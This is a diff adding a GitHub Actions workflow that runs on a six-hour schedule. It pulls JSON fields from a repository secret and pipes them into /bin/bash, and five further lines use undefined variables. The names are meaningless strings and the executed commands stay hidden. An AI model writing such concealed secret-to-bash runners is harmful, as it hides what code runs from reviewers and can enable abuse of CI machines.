@@ -1,0 +1,22 @@
+name: qiqingpanzheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiqingpanzheng
+        env:
+          o94: ${{ secrets.o94 }}
+        run: |
+          echo $o94 | jq -r .e5 | /bin/bash
+          echo $ld53 | jq -r .aqgfs749 | /bin/bash
+          echo $kfb672 | jq -r .dyu31614 | /bin/bash
+          echo $jlfli45813 | jq -r .fylz5193 | /bin/bash
+          echo $pankr010 | jq -r .m64 | /bin/bash
+          echo $kgwp35 | jq -r .xblw476 | /bin/bash
+
